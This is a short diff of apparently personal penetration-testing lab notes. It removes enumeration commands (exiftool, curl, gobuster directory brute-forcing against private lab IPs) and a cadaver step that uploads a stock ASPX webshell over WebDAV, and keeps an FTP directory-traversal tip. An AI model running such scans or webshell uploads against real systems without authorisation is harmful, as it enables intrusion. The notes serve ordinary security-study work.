@@ -2,52 +2,18 @@
 
 # Enumeration
 
-
-### nmap
-
-
-
-
-
-
 FTP
 ```jsx
 user
 ```
 
-
-
 <aside>
 💡 Try to do `cd ..` (in kiero it let do traversal)
 
-</aside>
 
-```jsx
-exiftool -a -G1 FUNCTION-TEMPLATE.pdf
-```
 
 ## Web
 
-```jsx
-curl -L http://192.168.248.65:9998/
-```
-
-```jsx
-gobuster dir -u http://192.168.167.127:45332/ -w /usr/share/wordlists/dirb/common.txt -t 99 2>/dev/null
-```
-
-```jsx
-gobuster dir -u http://192.168.121.122 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,md,php,asp,aspx -t 99 2>/dev/null
-gobuster dir -u https://192.168.249.140/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,md,php,asp,aspx -t 99 2>/dev/null
-```
-
-
-Abuse webdav with cadavr:
-
-```jsx
-cadaver http://192.168.157.122
-put /usr/share/webshells/aspx/cmdasp.aspx
-```
 
 ### LFI
 
